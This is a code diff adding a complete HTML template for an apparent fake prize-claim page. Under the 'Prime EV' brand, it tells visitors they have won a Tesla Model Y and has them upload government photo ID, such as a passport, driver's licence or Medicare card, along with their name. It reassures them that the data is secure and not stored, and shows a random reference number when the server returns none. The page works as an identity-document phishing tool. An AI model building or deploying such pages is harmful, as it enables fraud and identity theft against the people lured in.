@@ -1,0 +1,1101 @@
+{% load humanize %}
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="csrf-token" content="{{ csrf_token }}" />
+    <title>Claim Your Prize — Prime EV</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --gold: #00ff3c;
+        --black: #0a0a0a;
+        --dark: #111111;
+        --card: #1a1a1a;
+        --border: #252525;
+        --muted: #666666;
+        --red: #e31937;
+      }
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      html {
+        scroll-behavior: smooth;
+      }
+
+      body {
+        background: var(--black);
+        background-image:
+          radial-gradient(
+            ellipse 80% 50% at 50% -20%,
+            rgba(0, 255, 60, 0.06),
+            transparent
+          ),
+          url(http://primedriven.live/assets/cdn/img/bg_main.png);
+        color: #fff;
+        font-family: "DM Sans", sans-serif;
+        min-height: 100vh;
+        min-height: 100svh;
+      }
+
+      /* ── NAV ── */
+      nav {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 100;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 14px 24px;
+        background: rgba(10, 10, 10, 0.94);
+        -webkit-backdrop-filter: blur(14px);
+        backdrop-filter: blur(14px);
+        border-bottom: 1px solid var(--border);
+      }
+      nav img {
+        height: 28px;
+      }
+      .nav-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        background: rgba(0, 255, 60, 0.08);
+        border: 1px solid rgba(0, 255, 60, 0.3);
+        border-radius: 2px;
+        padding: 6px 14px;
+        font-size: 11px;
+        font-weight: 700;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+        color: var(--gold);
+      }
+      .nav-dot {
+        width: 6px;
+        height: 6px;
+        border-radius: 50%;
+        background: var(--gold);
+        box-shadow: 0 0 8px var(--gold);
+        animation: pulse 1.5s infinite;
+      }
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+          transform: scale(1);
+        }
+        50% {
+          opacity: 0.5;
+          transform: scale(0.85);
+        }
+      }
+
+      /* ── HERO ── */
+      .page-wrap {
+        min-height: 100vh;
+        min-height: 100svh;
+        padding: 100px 24px 60px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .hero-label {
+        display: inline-flex;
+        align-items: center;
+        gap: 10px;
+        padding: 8px 16px;
+        border: 1px solid rgba(0, 255, 60, 0.35);
+        background: rgba(0, 255, 60, 0.06);
+        margin-bottom: 20px;
+        font-size: 11px;
+        font-weight: 700;
+        letter-spacing: 3px;
+        text-transform: uppercase;
+        color: var(--gold);
+      }
+
+      h1 {
+        font-family: "Bebas Neue", sans-serif;
+        font-size: clamp(52px, 12vw, 110px);
+        line-height: 0.9;
+        letter-spacing: 2px;
+        color: #fff;
+        text-align: center;
+        margin-bottom: 16px;
+        text-shadow: 0 8px 40px rgba(0, 0, 0, 0.8);
+      }
+      h1 em {
+        color: var(--gold);
+        font-style: normal;
+        text-shadow: 0 0 30px rgba(0, 255, 60, 0.3);
+      }
+
+      .hero-sub {
+        font-size: 15px;
+        color: var(--muted);
+        text-align: center;
+        max-width: 480px;
+        line-height: 1.7;
+        margin-bottom: 48px;
+      }
+      .hero-sub strong {
+        color: #ccc;
+      }
+
+      /* ── STEPS ── */
+      .steps-row {
+        display: flex;
+        align-items: center;
+        gap: 0;
+        margin-bottom: 48px;
+        width: 100%;
+        max-width: 560px;
+      }
+      .step-pill {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 6px;
+        position: relative;
+      }
+      .step-pill::after {
+        content: "";
+        position: absolute;
+        top: 14px;
+        left: calc(50% + 14px);
+        right: calc(-50% + 14px);
+        height: 1px;
+        background: var(--border);
+      }
+      .step-pill:last-child::after {
+        display: none;
+      }
+      .step-circle {
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        background: var(--card);
+        border: 1px solid var(--border);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 11px;
+        font-weight: 700;
+        color: var(--muted);
+        position: relative;
+        z-index: 1;
+        transition:
+          background 0.3s,
+          border-color 0.3s,
+          color 0.3s;
+      }
+      .step-circle.active {
+        background: var(--gold);
+        border-color: var(--gold);
+        color: var(--black);
+      }
+      .step-circle.done {
+        background: rgba(0, 255, 60, 0.12);
+        border-color: rgba(0, 255, 60, 0.4);
+        color: var(--gold);
+      }
+      .step-label {
+        font-size: 10px;
+        font-weight: 600;
+        letter-spacing: 1.5px;
+        text-transform: uppercase;
+        color: var(--muted);
+        text-align: center;
+        transition: color 0.3s;
+      }
+      .step-pill.active .step-label {
+        color: var(--gold);
+      }
+      .step-pill.done .step-label {
+        color: rgba(0, 255, 60, 0.6);
+      }
+
+      /* ── CARD ── */
+      .claim-card {
+        width: 100%;
+        max-width: 560px;
+        background: var(--dark);
+        border: 1px solid var(--border);
+        border-radius: 4px;
+        overflow: hidden;
+      }
+
+      .card-head {
+        padding: 22px 28px 18px;
+        border-bottom: 1px solid var(--border);
+        background: #0d0d0d;
+      }
+      .card-eyebrow {
+        font-size: 10px;
+        font-weight: 700;
+        letter-spacing: 3px;
+        text-transform: uppercase;
+        color: var(--gold);
+        margin-bottom: 4px;
+      }
+      .card-title {
+        font-family: "Bebas Neue", sans-serif;
+        font-size: 28px;
+        color: #fff;
+        letter-spacing: 1px;
+        line-height: 1;
+      }
+
+      .card-body {
+        padding: 28px;
+      }
+
+      /* ── FIELDS ── */
+      .field {
+        margin-bottom: 18px;
+      }
+      .field label {
+        display: block;
+        font-size: 10px;
+        font-weight: 700;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+        color: #888;
+        margin-bottom: 8px;
+      }
+      .field input,
+      .field select {
+        width: 100%;
+        background: #0d0d0d;
+        border: 1px solid var(--border);
+        border-radius: 2px;
+        color: #fff;
+        font-family: "DM Sans", sans-serif;
+        font-size: 15px;
+        padding: 13px 14px;
+        outline: none;
+        transition:
+          border-color 0.2s,
+          box-shadow 0.2s;
+        -webkit-appearance: none;
+      }
+      .field input:focus,
+      .field select:focus {
+        border-color: var(--gold);
+        box-shadow: 0 0 0 3px rgba(0, 255, 60, 0.07);
+      }
+      .field input::placeholder {
+        color: #333;
+      }
+      .field input.error {
+        border-color: var(--red);
+      }
+
+      .field-row {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 14px;
+      }
+
+      /* ── UPLOAD ZONE ── */
+      .upload-zone {
+        border: 2px dashed var(--border);
+        border-radius: 4px;
+        padding: 32px 20px;
+        text-align: center;
+        cursor: pointer;
+        transition:
+          border-color 0.2s,
+          background 0.2s;
+        position: relative;
+        background: #0d0d0d;
+      }
+      .upload-zone:hover,
+      .upload-zone.drag-over {
+        border-color: rgba(0, 255, 60, 0.4);
+        background: rgba(0, 255, 60, 0.03);
+      }
+      .upload-zone.has-file {
+        border-color: rgba(0, 255, 60, 0.4);
+        background: rgba(0, 255, 60, 0.04);
+      }
+      .upload-zone input[type="file"] {
+        position: absolute;
+        inset: 0;
+        opacity: 0;
+        cursor: pointer;
+        width: 100%;
+        height: 100%;
+      }
+      .upload-icon {
+        font-size: 32px;
+        margin-bottom: 10px;
+        display: block;
+      }
+      .upload-title {
+        font-size: 14px;
+        font-weight: 600;
+        color: #fff;
+        margin-bottom: 4px;
+      }
+      .upload-sub {
+        font-size: 12px;
+        color: var(--muted);
+        line-height: 1.5;
+      }
+      .upload-sub strong {
+        color: #888;
+      }
+      .upload-preview {
+        display: none;
+        align-items: center;
+        gap: 12px;
+        background: rgba(0, 255, 60, 0.06);
+        border: 1px solid rgba(0, 255, 60, 0.2);
+        border-radius: 3px;
+        padding: 12px 14px;
+        margin-top: 14px;
+        text-align: left;
+      }
+      .upload-preview.show {
+        display: flex;
+      }
+      .preview-icon {
+        font-size: 22px;
+        flex-shrink: 0;
+      }
+      .preview-name {
+        font-size: 13px;
+        color: var(--gold);
+        font-weight: 600;
+        word-break: break-all;
+      }
+      .preview-size {
+        font-size: 11px;
+        color: var(--muted);
+      }
+      .preview-remove {
+        margin-left: auto;
+        width: 22px;
+        height: 22px;
+        border-radius: 50%;
+        background: #1a1a1a;
+        border: 1px solid #333;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        color: var(--muted);
+        font-size: 11px;
+        flex-shrink: 0;
+      }
+      .preview-remove:hover {
+        color: #fff;
+      }
+
+      /* ── ID TYPE PILLS ── */
+      .id-types {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 8px;
+        margin-bottom: 14px;
+      }
+      .id-type-pill {
+        padding: 6px 14px;
+        border-radius: 2px;
+        background: var(--card);
+        border: 1px solid var(--border);
+        font-size: 12px;
+        font-weight: 600;
+        color: var(--muted);
+        cursor: pointer;
+        transition: all 0.15s;
+        user-select: none;
+      }
+      .id-type-pill.selected {
+        background: rgba(0, 255, 60, 0.08);
+        border-color: rgba(0, 255, 60, 0.4);
+        color: var(--gold);
+      }
+
+      /* ── NOTICE BOX ── */
+      .notice {
+        display: flex;
+        gap: 12px;
+        align-items: flex-start;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid var(--border);
+        border-radius: 3px;
+        padding: 14px;
+        margin-bottom: 22px;
+      }
+      .notice-icon {
+        font-size: 16px;
+        flex-shrink: 0;
+        margin-top: 1px;
+      }
+      .notice-text {
+        font-size: 12px;
+        color: var(--muted);
+        line-height: 1.65;
+      }
+      .notice-text strong {
+        color: #aaa;
+      }
+
+      /* ── DIVIDER ── */
+      .divider {
+        height: 1px;
+        background: var(--border);
+        margin: 22px 0;
+      }
+
+      /* ── BUTTONS ── */
+      .btn-primary {
+        width: 100%;
+        background: var(--gold);
+        color: var(--black);
+        border: none;
+        font-family: "DM Sans", sans-serif;
+        font-size: 13px;
+        font-weight: 700;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+        padding: 16px;
+        border-radius: 2px;
+        cursor: pointer;
+        transition:
+          background 0.2s,
+          transform 0.15s;
+      }
+      .btn-primary:hover {
+        background: #00e635;
+        transform: translateY(-1px);
+      }
+      .btn-primary:disabled {
+        background: #1a1a1a;
+        color: #333;
+        cursor: not-allowed;
+        transform: none;
+      }
+      .btn-back {
+        background: transparent;
+        border: 1px solid var(--border);
+        color: var(--muted);
+        font-family: "DM Sans", sans-serif;
+        font-size: 12px;
+        font-weight: 600;
+        padding: 12px 20px;
+        border-radius: 2px;
+        cursor: pointer;
+        transition:
+          border-color 0.2s,
+          color 0.2s;
+      }
+      .btn-back:hover {
+        border-color: #444;
+        color: #fff;
+      }
+
+      /* ── STEP PANELS ── */
+      .step-panel {
+        display: none;
+      }
+      .step-panel.active {
+        display: block;
+      }
+
+      /* ── SUCCESS ── */
+      .success-wrap {
+        text-align: center;
+        padding: 40px 28px 32px;
+      }
+      .success-ring {
+        width: 72px;
+        height: 72px;
+        border-radius: 50%;
+        background: rgba(0, 255, 60, 0.1);
+        border: 2px solid rgba(0, 255, 60, 0.4);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 30px;
+        margin: 0 auto 20px;
+        animation: successPop 0.5s cubic-bezier(0.2, 0.8, 0.4, 1) forwards;
+      }
+      @keyframes successPop {
+        from {
+          transform: scale(0.6);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+      .success-title {
+        font-family: "Bebas Neue", sans-serif;
+        font-size: 38px;
+        color: #fff;
+        letter-spacing: 2px;
+        margin-bottom: 10px;
+      }
+      .success-sub {
+        font-size: 14px;
+        color: var(--muted);
+        line-height: 1.7;
+        max-width: 380px;
+        margin: 0 auto 24px;
+      }
+      .success-sub strong {
+        color: #ccc;
+      }
+      .ref-box {
+        display: inline-block;
+        background: rgba(0, 255, 60, 0.06);
+        border: 1px solid rgba(0, 255, 60, 0.2);
+        border-radius: 3px;
+        padding: 12px 28px;
+        font-family: "Bebas Neue", sans-serif;
+        font-size: 26px;
+        color: var(--gold);
+        letter-spacing: 4px;
+        margin-bottom: 24px;
+      }
+      .success-steps {
+        text-align: left;
+        background: #0d0d0d;
+        border: 1px solid var(--border);
+        border-radius: 3px;
+        padding: 18px 20px;
+        margin-bottom: 8px;
+      }
+      .success-step-row {
+        display: flex;
+        gap: 12px;
+        align-items: flex-start;
+        padding: 7px 0;
+        border-bottom: 1px solid var(--border);
+        font-size: 13px;
+        color: var(--muted);
+      }
+      .success-step-row:last-child {
+        border: none;
+      }
+      .success-step-num {
+        font-family: "Bebas Neue", sans-serif;
+        font-size: 14px;
+        color: var(--gold);
+        letter-spacing: 1px;
+        flex-shrink: 0;
+        margin-top: 1px;
+      }
+
+      /* ── RESPONSIVE ── */
+      @media (max-width: 600px) {
+        .page-wrap {
+          padding: 88px 16px 48px;
+        }
+        .card-body {
+          padding: 20px;
+        }
+        .card-head {
+          padding: 18px 20px 14px;
+        }
+        .field-row {
+          grid-template-columns: 1fr;
+        }
+        .steps-row {
+          gap: 0;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- NAV -->
+    <nav>
+      <img src="/assets/cdn/img/evlogoi.png" alt="PrimeDriven EV" />
+      <div class="nav-badge">
+        <div class="nav-dot"></div>
+        Prize Claim
+      </div>
+    </nav>
+
+    <div class="page-wrap">
+      <!-- HERO TEXT -->
+      <div class="hero-label">
+        <div class="nav-dot"></div>
+        Winner Verification
+      </div>
+      <h1>Claim Your<br /><em>Prize</em></h1>
+      <p class="hero-sub">
+        Congratulations on your win. Complete the steps below to verify your
+        identity and get your
+        <strong>Tesla Model Y RWD</strong> on its way to you.
+      </p>
+
+      <!-- STEP INDICATORS -->
+      <div class="steps-row" id="stepsRow">
+        <div class="step-pill active" id="pill-1">
+          <div class="step-circle active" id="circle-1">1</div>
+          <span class="step-label">Details</span>
+        </div>
+        <div class="step-pill" id="pill-2">
+          <div class="step-circle" id="circle-2">2</div>
+          <span class="step-label">Verify ID</span>
+        </div>
+        <div class="step-pill" id="pill-3">
+          <div class="step-circle" id="circle-3">3</div>
+          <span class="step-label">Done</span>
+        </div>
+      </div>
+
+      <!-- CARD -->
+      <div class="claim-card">
+        <!-- ── STEP 1: DETAILS ── -->
+        <div class="step-panel active" id="panel-1">
+          <div class="card-head">
+            <div class="card-eyebrow">Step 1 of 2</div>
+            <div class="card-title">Confirm Your Details</div>
+          </div>
+          <div class="card-body">
+            <div class="notice">
+              <span class="notice-icon">🏆</span>
+              <div class="notice-text">
+                Enter the <strong>exact name and entry number</strong> used when
+                you registered. We'll match these against our draw records
+                before proceeding.
+              </div>
+            </div>
+
+            <div class="field">
+              <label for="c-name">Full Name</label>
+              <input
+                type="text"
+                id="c-name"
+                placeholder="As registered on entry"
+              />
+            </div>
+
+            <div class="field">
+              <label for="c-entry">Entry Number</label>
+              <input type="text" id="c-entry" placeholder="#00482" />
+            </div>
+
+            <div class="divider"></div>
+
+            <button class="btn-primary" onclick="goToStep2()">
+              Continue to ID Verification →
+            </button>
+
+            <p
+              style="
+                text-align: center;
+                font-size: 11px;
+                color: #333;
+                margin-top: 12px;
+              "
+            >
+              🔒 Your details are secure and used only for prize verification
+            </p>
+          </div>
+        </div>
+
+        <!-- ── STEP 2: ID UPLOAD ── -->
+        <div class="step-panel" id="panel-2">
+          <div class="card-head">
+            <div class="card-eyebrow">Step 2 of 2</div>
+            <div class="card-title">Upload Valid ID</div>
+          </div>
+          <div class="card-body">
+            <div class="notice">
+              <span class="notice-icon">🔒</span>
+              <div class="notice-text">
+                We require a valid government-issued ID to verify your identity
+                before releasing any prize. Your ID is
+                <strong>only used for verification</strong> and is never shared
+                or stored beyond this process.
+              </div>
+            </div>
+
+            <!-- ID type selector -->
+            <div class="field">
+              <label>Select ID Type</label>
+              <div class="id-types" id="idTypes">
+                <div class="id-type-pill selected" onclick="selectIdType(this)">
+                  Driver's Licence
+                </div>
+                <div class="id-type-pill" onclick="selectIdType(this)">
+                  Passport
+                </div>
+                <div class="id-type-pill" onclick="selectIdType(this)">
+                  Medicare Card
+                </div>
+                <div class="id-type-pill" onclick="selectIdType(this)">
+                  State ID
+                </div>
+              </div>
+            </div>
+
+            <!-- upload zone -->
+            <div class="field">
+              <label>Upload ID Document</label>
+              <div class="upload-zone" id="uploadZone">
+                <input
+                  type="file"
+                  id="idFile"
+                  accept="image/*,.pdf"
+                  onchange="handleFile(this)"
+                />
+                <span class="upload-icon">📎</span>
+                <div class="upload-title">Tap to upload or drag and drop</div>
+                <div class="upload-sub">
+                  <strong>JPG, PNG or PDF</strong> · Max 10MB<br />
+                  Make sure all four corners of your ID are visible
+                </div>
+              </div>
+
+              <!-- file preview -->
+              <div class="upload-preview" id="uploadPreview">
+                <span class="preview-icon" id="previewIcon">🖼️</span>
+                <div>
+                  <div class="preview-name" id="previewName">filename.jpg</div>
+                  <div class="preview-size" id="previewSize">2.4 MB</div>
+                </div>
+                <div class="preview-remove" onclick="removeFile()">✕</div>
+              </div>
+            </div>
+
+            <div
+              class="notice"
+              style="
+                border-color: rgba(0, 255, 60, 0.15);
+                background: rgba(0, 255, 60, 0.03);
+              "
+            >
+              <span class="notice-icon">✅</span>
+              <div class="notice-text">
+                <strong>What we accept:</strong> Any government-issued photo ID.
+                Make sure the document is not expired, not blurry, and your full
+                name is clearly visible.
+              </div>
+            </div>
+
+            <div class="divider"></div>
+
+            <div style="display: flex; gap: 12px; align-items: center">
+              <button class="btn-back" onclick="goToStep1()">← Back</button>
+              <button
+                class="btn-primary"
+                id="submitBtn"
+                onclick="submitClaim()"
+              >
+                Submit My Claim →
+              </button>
+            </div>
+
+            <p
+              style="
+                text-align: center;
+                font-size: 11px;
+                color: #333;
+                margin-top: 12px;
+              "
+            >
+              We aim to process all verified claims within
+              <strong style="color: #555">1–3 days</strong>
+            </p>
+          </div>
+        </div>
+
+        <!-- ── STEP 3: SUCCESS ── -->
+        <div class="step-panel" id="panel-3">
+          <div class="success-wrap">
+            <div class="success-ring">🏆</div>
+            <div class="success-title">Claim Received!</div>
+            <p class="success-sub">
+              We've got everything we need. Our team will verify your details
+              and be in touch within <strong>1–3 days</strong> to arrange your
+              delivery.
+            </p>
+            <div class="ref-box" id="refNumber">#——</div>
+
+            <div class="success-steps">
+              <div class="success-step-row">
+                <span class="success-step-num">01</span>
+                <span
+                  >Our team verifies your entry number and ID — usually within
+                  48 hours</span
+                >
+              </div>
+              <div class="success-step-row">
+                <span class="success-step-num">02</span>
+                <span
+                  >We contact you by email and phone to confirm delivery
+                  details</span
+                >
+              </div>
+              <div class="success-step-row">
+                <span class="success-step-num">03</span>
+                <span
+                  >You choose your Tesla colour and we arrange free delivery to
+                  your door</span
+                >
+              </div>
+            </div>
+
+            <p
+              style="
+                font-size: 12px;
+                color: #444;
+                margin-top: 16px;
+                line-height: 1.6;
+              "
+            >
+              Questions? Email us at
+              <a
+                href="mailto:support@primedriven.live"
+                style="color: var(--gold); text-decoration: none"
+              >
+                support@primedriven.live
+              </a>
+            </p>
+          </div>
+        </div>
+      </div>
+      <!-- end card -->
+    </div>
+    <!-- end page-wrap -->
+
+    <script>
+      (function () {
+        var currentStep = 1;
+        var selectedIdType = "Driver's Licence";
+        var fileSelected = false;
+
+        /* ── step navigation ── */
+        window.goToStep2 = function () {
+          var name = document.getElementById("c-name").value.trim();
+          var entry = document.getElementById("c-entry").value.trim();
+
+          /* basic validation */
+          var ok = true;
+          ["c-name", "c-entry"].forEach(function (id) {
+            var el = document.getElementById(id);
+            if (!el.value.trim()) {
+              el.classList.add("error");
+              ok = false;
+            } else {
+              el.classList.remove("error");
+            }
+          });
+
+          if (!ok) {
+            showToast("Please fill in all fields correctly.");
+            return;
+          }
+
+          setStep(2);
+        };
+
+        window.goToStep1 = function () {
+          setStep(1);
+        };
+
+        window.submitClaim = async function () {
+          if (!fileSelected) {
+            showToast("Please upload a valid ID document to continue.");
+            return;
+          }
+
+          var btn = document.getElementById("submitBtn");
+          btn.disabled = true;
+          btn.textContent = "Submitting…";
+
+          try {
+            var fd = new FormData();
+            fd.append(
+              "full_name",
+              document.getElementById("c-name").value.trim(),
+            );
+            fd.append(
+              "entry_number",
+              document.getElementById("c-entry").value.trim(),
+            );
+
+            fd.append("id_type", selectedIdType);
+            fd.append("id_file", document.getElementById("idFile").files[0]);
+            fd.append("step", "claim");
+
+            var res = await fetch("/prize-claims/", {
+              method: "POST",
+              headers: { "X-CSRFToken": getMeta("csrf-token") },
+              body: fd,
+            });
+
+            var data = await res.json().catch(function () {
+              return {};
+            });
+
+            if (res.ok) {
+              setStep(3);
+              var ref = document.getElementById("refNumber");
+              if (data.claim_id) ref.textContent = "#" + data.claim_id;
+              else
+                ref.textContent =
+                  "#" + Math.floor(10000 + Math.random() * 90000);
+            } else {
+              showToast(
+                data.message || "Something went wrong. Please try again.",
+              );
+            }
+          } catch (err) {
+            console.error(err);
+            showToast(
+              "Network error — please check your connection and try again.",
+            );
+          } finally {
+            btn.disabled = false;
+            btn.textContent = "Submit My Claim →";
+          }
+        };
+
+        /* ── step UI ── */
+        function setStep(n) {
+          currentStep = n;
+
+          /* panels */
+          document.querySelectorAll(".step-panel").forEach(function (p) {
+            p.classList.remove("active");
+          });
+          document.getElementById("panel-" + n).classList.add("active");
+
+          /* pills */
+          for (var i = 1; i <= 3; i++) {
+            var pill = document.getElementById("pill-" + i);
+            var circle = document.getElementById("circle-" + i);
+            pill.classList.remove("active", "done");
+            circle.classList.remove("active", "done");
+
+            if (i < n) {
+              pill.classList.add("done");
+              circle.classList.add("done");
+              circle.textContent = "✓";
+            } else if (i === n) {
+              pill.classList.add("active");
+              circle.classList.add("active");
+              circle.textContent = i;
+            } else {
+              circle.textContent = i;
+            }
+          }
+
+          window.scrollTo({ top: 0, behavior: "smooth" });
+        }
+
+        /* ── id type picker ── */
+        window.selectIdType = function (el) {
+          document.querySelectorAll(".id-type-pill").forEach(function (p) {
+            p.classList.remove("selected");
+          });
+          el.classList.add("selected");
+          selectedIdType = el.textContent;
+        };
+
+        /* ── file handling ── */
+        window.handleFile = function (input) {
+          var file = input.files[0];
+          if (!file) return;
+
+          if (file.size > 10 * 1024 * 1024) {
+            showToast("File is too large — maximum size is 10MB.");
+            input.value = "";
+            return;
+          }
+
+          fileSelected = true;
+
+          var zone = document.getElementById("uploadZone");
+          var preview = document.getElementById("uploadPreview");
+          var icon = document.getElementById("previewIcon");
+          var name = document.getElementById("previewName");
+          var size = document.getElementById("previewSize");
+
+          zone.classList.add("has-file");
+          preview.classList.add("show");
+
+          icon.textContent = file.type === "application/pdf" ? "📄" : "🖼️";
+          name.textContent = file.name;
+          size.textContent = (file.size / (1024 * 1024)).toFixed(2) + " MB";
+        };
+
+        window.removeFile = function () {
+          fileSelected = false;
+          document.getElementById("idFile").value = "";
+          document.getElementById("uploadZone").classList.remove("has-file");
+          document.getElementById("uploadPreview").classList.remove("show");
+        };
+
+        /* ── drag and drop ── */
+        var zone = document.getElementById("uploadZone");
+        zone.addEventListener("dragover", function (e) {
+          e.preventDefault();
+          zone.classList.add("drag-over");
+        });
+        zone.addEventListener("dragleave", function () {
+          zone.classList.remove("drag-over");
+        });
+        zone.addEventListener("drop", function (e) {
+          e.preventDefault();
+          zone.classList.remove("drag-over");
+          var file = e.dataTransfer.files[0];
+          if (file) {
+            var dt = new DataTransfer();
+            dt.items.add(file);
+            document.getElementById("idFile").files = dt.files;
+            handleFile(document.getElementById("idFile"));
+          }
+        });
+
+        /* ── remove error on type ── */
+        document.querySelectorAll(".field input").forEach(function (el) {
+          el.addEventListener("input", function () {
+            el.classList.remove("error");
+          });
+        });
+
+        /* ── toast ── */
+        function showToast(msg) {
+          var t = document.createElement("div");
+          t.textContent = msg;
+          t.style.cssText =
+            "position:fixed;top:80px;left:50%;transform:translateX(-50%);" +
+            "background:#1a0a0a;border:1px solid rgba(227,25,55,0.4);border-radius:4px;" +
+            "padding:12px 20px;font-size:13px;color:#ff6b6b;font-family:'DM Sans',sans-serif;" +
+            "z-index:9999;white-space:nowrap;box-shadow:0 8px 24px rgba(0,0,0,0.5);";
+          document.body.appendChild(t);
+          setTimeout(function () {
+            t.remove();
+          }, 4000);
+        }
+
+        /* ── csrf ── */
+        function getMeta(name) {
+          var el = document.querySelector('meta[name="' + name + '"]');
+          return el ? el.getAttribute("content") : "";
+        }
+      })();
+    </script>
+  </body>
+</html>
